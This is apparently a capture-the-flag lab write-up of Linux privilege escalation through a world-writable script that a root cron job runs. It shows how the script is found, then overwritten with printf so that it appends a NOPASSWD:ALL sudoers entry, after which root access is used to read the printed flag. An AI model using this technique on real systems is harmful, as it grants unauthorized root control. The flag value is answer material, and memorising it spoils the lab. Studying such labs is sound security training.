# 🔬Cron Jobs

### Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [Cron Jobs Gone Wild II](https://www.attackdefense.com/challengedetails?cid=77)
>
> * **Cron Jobs** Privilege escalation
> * Already logged on as `student` unprivileged user

```bash
whoami
groups student
ls -l
cat message
```

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

> There is a “message” file in the home directory of student user. Only root user has permissions on this file. So, student user can’t even read it.

```bash
cat /etc/passwd
crontab -l
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> `student` user has no privileges and no scheduled cron jobs

### Cron Jobs Identify <a href="#cron-jobs-identify" id="cron-jobs-identify"></a>

* Find if a file with the same name exists on the system.

```bash
find / -name message
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<pre class="language-bash"><code class="lang-bash">grep -rnw /usr/ -e "/home/student/message"
<strong>    /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
</strong></code></pre>

* The file has been copied into the /tmp directory

```bash
cat /tmp/message
    Hey!! you are not root :(
```

* Observe that a file with the same name is present in `/tmp` directory. On checking closely, it is clear that this file is being overwritten every minute.

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* This means there is some script/binary which is copying this file from student home directory to /tmp directory. Search for that script. If this script is doing simple copy operation, it must have source destination of the file in it. Try to locate that by using grep command.

```bash
grep -nri "/tmp/message" /usr/
    /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
    /usr/local/share/copy.sh:3:chmod 644 /tmp/message
```

* Check `copy.sh` privileges

```bash
ls -al /usr/local/share/copy.sh
	-rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
```

```bash
cat /usr/local/share/copy.sh
    #! /bin/bash
    cp /home/student/message /tmp/message
    chmod 644 /tmp/message
```

* As the script file is writable by current “student” user, it can be modified to execute our commands. This script is executed by root cron job, so it can do privileged operation.&#x20;
* But, the file can’t be modified directly as there is no text editor on the system.

```bash
vim /usr/local/share/copy.sh
bash: vim: command not found
student@attackdefense:~$ vi /usr/local/share/copy.sh
bash: vi: command not found
student@attackdefense:~$ nano /usr/local/share/copy.sh
bash: nano: command not found
```

### Privesc <a href="#privesc" id="privesc"></a>

* Every user account has read/write/execute permissions on the `copy.sh` script
* The script is writable by the `student` user. Modify the script to execute a command (`e.g.` a_dding **student** to `sudoers` file_).
  * When the script is executed by `root` cron job (_every 1 min for this lab_), it will run commands with pivileged permissions
  * No text editors available in the lab
* Use `printf` to replace the original code with the following lines

```bash
printf '!#bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
student@attackdefense:~$ cat /usr/local/share/copy.sh
!#bin/bash
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoersstudent@attackdefense:~$
```

* Check current sudoers list

```bash
sudo -l
    Matching Defaults entries for student on attackdefense:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User student may run the following commands on attackdefense:
        (root) NOPASSWD: /etc/init.d/cron
```

* There are no new entries. So, wait for 1 minute (i.e. the cron job runs every 1 minute) and check the sudoers list again. This time new entry is there.

```bash
sudo -l
    Matching Defaults entries for student on attackdefense:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User student may run the following commands on attackdefense:
        (root) NOPASSWD: /etc/init.d/cron
        (root) NOPASSWD: ALL
```

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Switch to the root user using `sudo su`and collect the flag from the root directory.

```bash
sudo su
root@attackdefense:/home/student# whoami
root
root@attackdefense:/home/student# cd /root
root@attackdefense:~# ls -l
total 4
-rw-r--r-- 1 root root 33 Nov  2  2018 flag
root@attackdefense:~# cat flag
697914df7a07bb9b718c8ed258150164
```

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `697914df7a07bb9b718c8ed258150164`
{% endhint %}



